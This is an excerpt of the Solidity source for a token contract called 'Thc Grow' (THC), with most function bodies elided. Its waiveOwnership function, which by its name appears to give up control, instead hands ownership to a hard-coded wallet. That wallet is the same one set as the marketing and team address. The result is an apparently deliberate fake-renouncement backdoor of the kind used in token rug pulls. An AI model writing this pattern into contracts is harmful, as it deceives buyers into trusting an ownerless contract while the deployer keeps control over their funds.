...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xB06148fB05d5C2BDfE6E70e65B0cA84C5d589273);
    }
...
contract THCGrow is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Thc Grow";
    string private _symbol = "THC";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xB06148fB05d5C2BDfE6E70e65B0cA84C5d589273);
    address payable private teamWalletAddress = payable(0xB06148fB05d5C2BDfE6E70e65B0cA84C5d589273);
